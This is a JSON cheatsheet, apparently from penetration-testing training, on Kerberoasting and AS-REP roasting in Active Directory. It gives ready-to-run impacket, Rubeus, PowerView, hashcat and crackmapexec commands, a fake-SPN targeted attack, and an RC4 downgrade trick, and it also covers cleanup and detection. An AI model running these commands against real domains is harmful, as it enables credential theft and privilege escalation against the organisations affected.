{
  "cheatsheets": [
    {
      "id": "ad-service-account-hunting",
      "name": "Active Directory Service Account Hunting (Kerberoasting)",
      "description": "Identify and exploit service accounts with registered SPNs - request TGS tickets encrypted with service account password hash, crack offline for credentials",
      "educational_header": {
        "how_to_recognize": [
          "You have domain user credentials (even low-privilege - any authenticated user can Kerberoast)",
          "Looking for privilege escalation vectors in Active Directory",
          "SPN enumeration reveals accounts with servicePrincipalName attribute",
          "Service accounts often have weak passwords (human-generated, 8-12 chars, never expire)"
        ],
        "when_to_look_for": [
          "After initial domain reconnaissance completes",
          "When you have valid credentials but no admin access",
          "security assessment: Always check for Kerberoastable accounts on domain-joined machines",
          "Service accounts frequently have SeImpersonate, SQLAdmin, or local admin rights elsewhere"
        ]
      },
      "scenarios": [
        {
          "title": "Scenario 1: Discovery Phase - Identify Kerberoastable Accounts",
          "context": "You have domain user credentials (corp\\lowpriv) on a Windows 10 workstation. Initial recon showed 250+ domain users. You need to identify which accounts are Kerberoastable (have SPNs registered) before attempting ticket requests. Time-efficient filtering is critical.",
          "approach": "Use setspn.exe (legacy) or PowerView (modern) to query Active Directory for all accounts with servicePrincipalName attribute set. Any domain user can read this attribute - no special permissions required. Focus on user accounts (not computer accounts - those have 120-char random passwords).",
          "commands": [
            "setspn-list-user-spns",
            "impacket-getuserspns-list",
            "rubeus-kerberoast"
          ],
          "expected_outcome": "You'll discover 2-5 service accounts like 'sqlservice', 'iis_svc', 'backupuser' with SPNs like 'MSSQLSvc/db01.corp.com:1433'. These are your targets. Computer accounts (ending in $) can be ignored. Focus on human-managed service accounts - they typically have weak, static passwords.",
          "why_this_works": "Active Directory stores SPNs as a multi-valued attribute (servicePrincipalName) on user objects. This attribute must be readable by all authenticated users for Kerberos authentication to function. When a client needs to access a service, it queries AD for the SPN to determine which account to request a ticket for. You're using the same mechanism, but for reconnaissance instead of legitimate access."
        },
        {
          "title": "Scenario 2: Modern Kerberoasting - Rubeus or impacket-GetUserSPNs",
          "context": "You're on Kali Linux with domain credentials (corp\\testuser:SecureP@ss123!) or have RDP access to Windows domain-joined system. You've identified 3 service accounts with SPNs (sql_service, iis_service, svc_backup). You want to extract TGS-REP hashes using modern tools for immediate offline cracking.",
          "approach": "LINUX: Use impacket-GetUserSPNs with -request flag to enumerate SPNs AND extract TGS hashes in one command. Output is Hashcat mode 13100 compatible. WINDOWS: Use Rubeus.exe kerberoast to automatically find all SPNs on user accounts and extract hashes. Both methods are significantly faster than legacy PowerShell approaches.",
          "commands": [
            "impacket-getuserspns-kerberoast",
            "rubeus-kerberoast",
            "hashcat-crack-tgsrep"
          ],
          "expected_outcome": "LINUX OUTPUT: impacket-GetUserSPNs shows ServicePrincipalName, Name, MemberOf for each account. With -request flag, extracts TGS-REP hashes: $krb5tgs$23$*sql_service$CORP.COM$MSSQLSvc/db01*$abc123.... WINDOWS OUTPUT: Rubeus displays SamAccountName, DistinguishedName, ServicePrincipalName, Supported ETypes (RC4 vs AES), and hash output. Transfer hashes to Kali. CRACKING: hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force cracks 2/3 hashes in 15 minutes: sql_service:MSSQLPassword123!, iis_service:IIS2019!. TIME ESTIMATE: Enumeration (10 sec) + hash extraction (10 sec) + transfer (30 sec) + cracking (5-60 min).",
          "why_this_works": "impacket-GetUserSPNs: Python-based tool using LDAP to enumerate SPNs, then Kerberos AS-REQ/TGS-REQ to obtain service tickets. Automatically formats output for Hashcat. Rubeus: C# .NET tool using native Windows Kerberos API (System.IdentityModel). Faster than PowerShell because it's compiled and uses direct API calls. BOTH TOOLS: Request TGS tickets for identified SPNs. TGS is encrypted with service account's Kerberos key (derived from password hash). Extract encrypted portion, crack offline with Hashcat. NO PERMISSION CHECKS: Kerberos allows ANY authenticated user to request TGS for ANY SPN. Permission checks only occur when USING the service, not when REQUESTING the ticket."
        },
        {
          "title": "Scenario 3: PowerView Automated Kerberoasting",
          "context": "You have PowerView loaded and identified 4 Kerberoastable accounts. You want to automate ticket request + extraction in a single command. Output should be hashcat-ready format for immediate offline cracking. This is the security assessment scenario - speed matters.",
          "approach": "Use Invoke-Kerberoast PowerView function to automate the entire attack chain: SPN discovery, ticket request, ticket extraction, and hashcat format conversion. This is faster than manual PowerShell System.IdentityModel approach for multiple accounts.",
          "commands": [
            "powerview-kerberoast",
            "hashcat-crack-tgsrep"
          ],
          "expected_outcome": "Invoke-Kerberoast -OutputFormat Hashcat outputs TGS-REP hashes directly: $krb5tgs$23$*sqlservice$CORP.COM$MSSQLSvc/db01*$abc123... for each service account. Copy hashes to file, transfer to Kali, crack with Hashcat mode 13100. Expect 1-2 crackable hashes within 10-30 minutes depending on password complexity.",
          "why_this_works": "PowerView Invoke-Kerberoast automates: (1) LDAP query for accounts with servicePrincipalName attribute. (2) TGS ticket request via System.IdentityModel.Tokens.KerberosRequestorSecurityToken. (3) Ticket extraction from memory. (4) Conversion to Hashcat format. Each TGS ticket is encrypted with the service account's Kerberos key. Since service accounts often have weak passwords (Password123, ServiceAccount2019!, company name + year), these hashes crack quickly with rule-based attacks."
        },
        {
          "title": "Scenario 4: Kerberoasting vs AS-REP Roasting - Decision Tree",
          "context": "You've compromised a domain user account (corp\\jdoe:Password123!) and want to maximize credential access attacks against Active Directory. You're deciding between Kerberoasting (targeting SPNs) and AS-REP Roasting (targeting users with preauthentication disabled). Both attacks extract offline-crackable hashes, but target different account types. You want to understand which to prioritize and when to use each.",
          "approach": "Run BOTH attacks in parallel - they target different misconfigurations and take <1 minute each to complete enumeration phase. Kerberoasting targets service accounts (common, 60-80% success rate in corporate domains). AS-REP roasting targets misconfigured user accounts (rare, <10% of domains, but when it exists often reveals privileged accounts). Decision matrix: (1) Kerberoasting: Always run first - higher success rate, targets service accounts which are often over-privileged. (2) AS-REP roasting: Run as second priority - lower success rate but fast (<30 seconds), may reveal admin accounts. (3) Both: Ideal approach - different attack surfaces, complementary techniques.",
          "commands": [
            "impacket-getuserspns-list",
            "impacket-getnpusers-identify",
            "impacket-getuserspns-kerberoast",
            "impacket-getnpusers-asreproast",
            "hashcat-crack-tgsrep",
            "hashcat-crack-asrep"
          ],
          "expected_outcome": "KERBEROASTING: Enumeration (impacket-GetUserSPNs without -request) finds 3 user SPNs: sql_service, iis_service, svc_backup. Request TGS (-request flag) extracts 3 hashes. Hashcat mode 13100 cracks 2/3 hashes: sql_service:SQLPassword123!, iis_service:IIS2019!. AS-REP ROASTING: Enumeration (impacket-GetNPUsers without -request) finds 1 vulnerable user: dave (standard user, no admin groups). Request AS-REP (-request flag) extracts hash. Hashcat mode 18200 cracks: dave:Flowers1. RESULT: 3 total cracked accounts (2 service accounts + 1 user). TIME ESTIMATE: Kerberoasting enum (10 sec) + request (10 sec) + crack (5-30 min). AS-REP enum (5 sec) + request (5 sec) + crack (1-30 min). Total: <60 minutes for complete credential access sweep.",
          "why_this_works": "KERBEROASTING MECHANISM: ANY authenticated user can request TGS tickets for ANY SPN. TGS is encrypted with service account password hash. Service accounts often have weak passwords (human-chosen, never changed, 8-12 chars). TARGET: User accounts with servicePrincipalName attribute. UNCRACKABLE: Computer accounts (MACHINE$) have 120-char random passwords. AS-REP ROASTING MECHANISM: If Kerberos preauthentication is DISABLED (DONT_REQ_PREAUTH UAC flag), KDC will issue AS-REP without password verification. AS-REP contains encrypted data using user's password hash. TARGET: Users with preauthentication disabled (rare - DEFAULT is enabled). COMPLEMENTARY ATTACKS: Kerberoasting finds service account passwords. AS-REP roasting finds misconfigured user accounts. Different targets = different credentials. pentest STRATEGY: Run both attacks early in domain assessment. Kerberoasting: High success rate, targets over-privileged service accounts. AS-REP roasting: Low success rate but extremely fast to check. DECISION MATRIX: [Found SPNs on user accounts?] → YES: Kerberoast (high priority). [Found users with DONT_REQ_PREAUTH?] → YES: AS-REP roast. [Found neither?] → Both techniques found nothing (expected in hardened environments). Proceed to: Password spraying, local privilege escalation, or lateral movement with existing credentials. TIME COMPARISON: Kerberoasting enum + crack = 10-60 min. AS-REP roasting enum + crack = 1-30 min. Running both sequentially = 11-90 min total. Running enumeration for both in parallel = <30 sec, then crack hashes together."
        },
        {
          "title": "Scenario 5: Targeted Kerberoasting with GenericWrite Permissions",
          "context": "You've compromised user corp\\alice and performed comprehensive AD enumeration. Standard Kerberoasting (impacket-GetUserSPNs) found 0 user accounts with SPNs - all services run as computer accounts (uncrackable 120-char passwords). However, ACL analysis (Get-DomainObjectAcl) shows alice has GenericWrite permissions on user corp\\bob. You want to perform TARGETED Kerberoasting: add fake SPN to bob's account, request TGS, crack password, then remove SPN to restore original state.",
          "approach": "Use PowerView Set-DomainObject to add servicePrincipalName attribute to bob's account (requires GenericWrite or GenericAll). Add fake SPN like HTTP/fake.corp.com (hostname doesn't need to exist - AD doesn't validate). Request TGS ticket with Rubeus or impacket-GetUserSPNs (targets newly-added SPN). Extract and crack TGS-REP hash. CRITICAL: Remove SPN after obtaining hash to avoid leaving permanent modification. Document all changes for assessment report.",
          "commands": [
            "targeted-kerberoast-set",
            "rubeus-kerberoast",
            "impacket-getuserspns-kerberoast",
            "hashcat-crack-tgsrep",
            "targeted-kerberoast-cleanup"
          ],
          "expected_outcome": "PERMISSION VERIFICATION: Get-DomainObjectAcl -Identity bob shows alice has GenericWrite (ActiveDirectoryRights = GenericWrite). ADD SPN: Set-DomainObject -Identity bob -Set @{serviceprincipalname='HTTP/fake.corp.com'} succeeds. VERIFICATION: Get-DomainUser bob -Properties serviceprincipalname shows SPN added. REQUEST TGS: Rubeus.exe kerberoast finds bob's new SPN, extracts TGS-REP hash. OUTPUT: $krb5tgs$23$*bob$CORP.COM$HTTP/fake.corp.com*$abc123.... CRACK: hashcat -m 13100 hash.txt rockyou.txt -r best64.rule --force cracks hash in 15 minutes: bob:CompanyPassword2023!. CLEANUP: Set-DomainObject -Identity bob -Clear serviceprincipalname removes SPN. VERIFICATION: Get-DomainUser bob -Properties serviceprincipalname shows empty/null (SPN removed). TIME ESTIMATE: ACL enum (30 sec) + set SPN (5 sec) + request TGS (10 sec) + crack (5-120 min) + cleanup (5 sec).",
          "why_this_works": "TARGETED KERBEROASTING exploits: (1) GenericWrite/GenericAll permissions allow modifying user attributes including servicePrincipalName. (2) Kerberos protocol allows ANY SPN value - AD doesn't validate hostname existence. (3) TGS tickets encrypted with user's password hash regardless of SPN validity. ATTACK SCENARIO: Standard Kerberoasting finds 0 SPNs on user accounts (all services use computer accounts). However, you have write permissions on other users (common via delegated administration, service account management, or ACL misconfigurations). PERMISSION REQUIREMENTS: GenericWrite OR GenericAll on target user. GenericWrite allows modifying most attributes. GenericAll grants full control. COMMON SCENARIOS: (1) IT administrators have GenericWrite on service account OUs. (2) Help desk has GenericAll on standard user OU. (3) Group-based delegation (Account Operators can modify users). (4) Misconfigured ACLs (GenericAll on entire Users container). SPN FORMAT: servicePrincipalName attribute accepts any string in protocol/hostname format (HTTP/fake.corp.com, MSSQLSvc/test.local:1433, anything/anywhere). AD performs NO VALIDATION of hostname or service. CLEANUP CRITICAL: Modifications to production AD require: (1) Written authorization in assessment scope. (2) Immediate cleanup after hash extraction. (3) Documentation in report (before/after attribute values). (4) Client notification if cleanup fails. DETECTION: Event ID 4738 (user account changed) or 5136 (directory service object modified) shows servicePrincipalName modification. Blue team should alert on SPN additions to standard user accounts. ALTERNATIVE ATTACKS: If no GenericWrite, try: (1) Password reset (more obvious, locks user out). (2) AS-REP roasting with DONT_REQ_PREAUTH modification. (3) Group membership modification (requires different permissions)."
        }
      ],
      "sections": [
        {
          "title": "Phase 1: SPN Discovery",
          "notes": "Identify which accounts have SPNs registered. Focus on user accounts (not computer accounts). Any authenticated domain user can query this - no special permissions needed. RECOMMENDED TOOLS: Windows → setspn -Q */* OR Rubeus.exe kerberoast (shows SPNs). Linux → impacket-GetUserSPNs (no -request flag). FILTER OUT: Computer accounts (ending in $) have 120-character random passwords - uncrackable. Only target USER accounts with SPNs.",
          "commands": [
            {
              "id": "setspn-list-user-spns",
              "example": "setspn -Q */*",
              "shows": "CN="
            },
            {
              "id": "impacket-getuserspns-list",
              "example": "impacket-GetUserSPNs -dc-ip 10.10.10.70 corp.com/meg:\"VimForPowerShell123!\"",
              "shows": "ServicePrincipalName"
            },
            {
              "id": "rubeus-kerberoast",
              "example": ".\\Rubeus.exe kerberoast /outfile:C:\\Tools\\hashes.kerberoast",
              "shows": "SamAccountName"
            }
          ]
        },
        {
          "title": "Phase 2: TGS Ticket Request and Hash Extraction",
          "notes": "Request TGS tickets for identified SPNs and extract hashes for offline cracking. LINUX: impacket-GetUserSPNs -request -outputfile hashes.kerberoast. WINDOWS: Rubeus.exe kerberoast /outfile:hashes.kerberoast. Both output Hashcat mode 13100 format. RC4 VS AES: Rubeus may show 'AES hashes will be returned' - use /tgtdeleg flag to force RC4 downgrade (10x faster to crack).",
          "commands": [
            {
              "id": "impacket-getuserspns-kerberoast",
              "example": "impacket-GetUserSPNs -request -dc-ip 10.10.10.70 corp.com/meg:\"VimForPowerShell123!\"",
              "shows": "ServicePrincipalName"
            },
            {
              "id": "rubeus-kerberoast",
              "example": ".\\Rubeus.exe kerberoast /outfile:C:\\Tools\\hashes.kerberoast",
              "shows": "SamAccountName"
            },
            {
              "id": "rubeus-kerberoast-aes",
              "example": ".\\Rubeus.exe kerberoast /tgtdeleg /outfile:C:\\Tools\\hashes_rc4.kerberoast",
              "shows": "Supported ETypes       : RC4_HMAC_DEFAULT"
            }
          ]
        },
        {
          "title": "Phase 3: Offline Hash Cracking",
          "notes": "Crack TGS-REP hashes with Hashcat mode 13100. ATTACK STRATEGY: (1) Straight dictionary: hashcat -m 13100 hashes.kerberoast rockyou.txt --force (try first). (2) Rule-based: Add best64.rule for common mutations. (3) Targeted: Create custom wordlist from company name, service type, common patterns. TIME ESTIMATE: Weak password (dict word + number) = 5-30 min. Strong password (12+ random chars) = infeasible.",
          "commands": [
            {
              "id": "hashcat-crack-tgsrep",
              "example": "hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force",
              "shows": "Cracked"
            }
          ]
        },
        {
          "title": "Phase 4: Credential Validation and Privilege Escalation",
          "notes": "Validate cracked service account credentials and check for privileges. VALIDATION: crackmapexec smb <DC_IP> -u service_account -p cracked_password -d domain.com. PRIVILEGE CHECK: net user service_account /domain (shows groups). LATERAL MOVEMENT: Service accounts often have: (1) Local admin on servers. (2) Domain admin membership (poor practice but common). (3) High-privilege groups (Backup Operators, Server Operators). (4) SeImpersonate token privileges.",
          "commands": [
            {
              "id": "crackmapexec-validate-admin",
              "example": "crackmapexec smb 10.10.10.75 -u dave -p 'Flowers1' -d corp.com",
              "shows": "[+]"
            }
          ]
        },
        {
          "title": "SPN Account Types and Crackability Quick Reference",
          "notes": "CRACKABLE ACCOUNTS (target these): (1) USER accounts with servicePrincipalName attribute (sql_service, iis_service, svc_backup). PASSWORD: Human-chosen, 8-14 chars typically, rarely changed. SUCCESS RATE: 60-80% in corporate domains. HASH FORMAT: $krb5tgs$23$ (RC4) or $krb5tgs$17$/$krb5tgs$18$ (AES). CRACKING TIME: 5-120 minutes with wordlist + rules. UNCRACKABLE ACCOUNTS (ignore these): (1) COMPUTER accounts (ending in $) - WEB01$, SQL-SERVER$, DC01$. PASSWORD: 120 characters, random, auto-rotated every 30 days. IMPOSSIBLE to crack. (2) MANAGED SERVICE ACCOUNTS (MSA) - objectClass = msDS-ManagedServiceAccount. PASSWORD: 120 characters, random, managed by AD. IMPOSSIBLE to crack. (3) GROUP MANAGED SERVICE ACCOUNTS (gMSA) - objectClass = msDS-GroupManagedServiceAccount. PASSWORD: 240 characters, random, managed by AD. IMPOSSIBLE to crack. IDENTIFICATION: Computer accounts have $ at end of sAMAccountName. MSA/gMSA have special objectClass. USER accounts have neither. PRACTICAL TIP: If impacket-GetUserSPNs or Rubeus finds ONLY computer accounts (all names end in $), Kerberoasting attack surface is ZERO. Document finding and proceed to alternative attacks (AS-REP roasting, password spraying, local privilege escalation). FILTERING: grep -v '\\$@' hashes.kerberoast removes computer account hashes before cracking attempt.",
          "commands": [
            {
              "id": "setspn-list-user-spns",
              "example": "setspn -Q */*",
              "shows": "CN="
            },
            {
              "id": "impacket-getuserspns-list",
              "example": "impacket-GetUserSPNs -dc-ip 10.10.10.70 corp.com/meg:\"VimForPowerShell123!\"",
              "shows": "ServicePrincipalName"
            }
          ]
        }
      ],
      "tags": [
        "ACTIVE_DIRECTORY",
        "KERBEROASTING",
        "SPN",
        "SERVICE_ACCOUNTS",
        "PRIVILEGE_ESCALATION",
        "QUICK_WIN"
      ]
    }
  ]
}